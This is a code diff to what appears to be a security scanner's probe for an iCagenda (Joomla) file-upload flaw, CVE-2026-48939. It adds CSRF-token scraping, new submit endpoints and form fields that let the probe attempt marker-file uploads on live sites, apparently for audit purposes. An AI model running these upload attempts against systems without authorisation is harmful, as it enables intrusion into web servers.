@@ -2,13 +2,14 @@ from __future__ import annotations
 
 import re
 import urllib.parse
+from datetime import datetime, timedelta, timezone
 from typing import Any
 
 from ...core.http import build_multipart, normalize_url, poll_paths, request
 from ...core.models import Finding
 
 CVECheckResult = Finding
-from ...core.probes import rand_str
+from ...core.probes import extract_csrf_candidates_from_html, rand_str
 from ...core.versions import version_in_specifier
 
 CVE_ID = "CVE-2026-48939"
@@ -27,9 +28,14 @@ UPLOAD_ENDPOINTS = [
     "/component/icagenda/?task=event.save",
     "/index.php?option=com_icagenda&task=registration.save",
 ]
+SUBMIT_ENDPOINTS = [
+    "/index.php?option=com_icagenda&task=submit.submit",
+    "/component/icagenda/?task=submit.submit",
+]
 PUBLIC_ATTACHMENT_DIRS = [
     "/images/com_icagenda/attachments/",
     "/images/icagenda/attachments/",
+    "/images/icagenda/frontend/attachments/",
     "/media/com_icagenda/attachments/",
     "/images/attachments/",
 ]
@@ -196,6 +202,44 @@ def discover_upload_profiles(base: str, timeout: int, proxy: str | None) -> list
     return discovered
 
 
+def _discover_submit_context(
+    base: str, timeout: int, proxy: str | None
+) -> tuple[str | None, str | None]:
+    """Find a CSRF token and optional menu itemid for the 4.x submit flow."""
+    paths = ["/index.php?option=com_icagenda&view=submit", "/component/icagenda/submit/", "/"]
+    for path in paths:
+        page = request(absolute_url(base, path), timeout=timeout, proxy=proxy)
+        if not page or page.get("status") != 200:
+            continue
+        html = page.get("body", "")
+        tokens = extract_csrf_candidates_from_html(html)
+        itemid = None
+        match = re.search(r'name="jform\[itemid\]"[^>]*value="([^"]*)"', html, re.IGNORECASE)
+        if match and match.group(1).isdigit():
+            itemid = match.group(1)
+        if tokens:
+            return tokens[0], itemid
+    return None, None
+
+
+def submit_profile_fields(token: str, itemid: str | None, days_ahead: int = 30) -> dict:
+    start = (datetime.now(timezone.utc) + timedelta(days=days_ahead)).strftime("%Y-%m-%d %H:%M:%S")
+    end = (datetime.now(timezone.utc) + timedelta(days=days_ahead, hours=2)).strftime("%Y-%m-%d %H:%M:%S")
+    fields = {
+        "jform[username]": "ProofCMS Lab Test",
+        "jform[created_by_email]": "audit@example.invalid",
+        "jform[title]": "ProofCMS Lab Test",
+        "jform[catid]": "1",
+        "jform[startdate]": start,
+        "jform[enddate]": end,
+        "jform[consent][consent_tos]": "tos",
+        token: "1",
+    }
+    if itemid:
+        fields["jform[itemid]"] = itemid
+    return fields
+
+
 def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None = None) -> Finding:
     base = normalize_url(target_url)
     marker = f"JVH_ICAGENDA_CONFIRMED_{rand_str(10)}"
@@ -218,6 +262,22 @@ def run_aggressive_probe(target_url: str, timeout: int = 12, proxy: str | None =
             profile_copy["upload_url"] = f"{base}{endpoint}"
             profile_copy["endpoint_label"] = endpoint
             attempts.append(profile_copy)
+
+    submit_token, submit_itemid = _discover_submit_context(base, timeout, proxy)
+    if submit_token:
+        observed.append(f"submit token source found (itemid={submit_itemid or 'none'})")
+        for endpoint in SUBMIT_ENDPOINTS:
+            attempts.append(
+                {
+                    "name": "submit_4x",
+                    "upload_url": f"{base}{endpoint}",
+                    "endpoint_label": endpoint,
+                    "fields": submit_profile_fields(submit_token, submit_itemid),
+                    "file_field": "jform[file]",
+                }
+            )
+    else:
+        observed.append("no submit token found; 4.x submit flow skipped")
 
     for profile in attempts:
         endpoint_label = profile.get("endpoint_label") or profile.get("upload_url", "discovered-form")
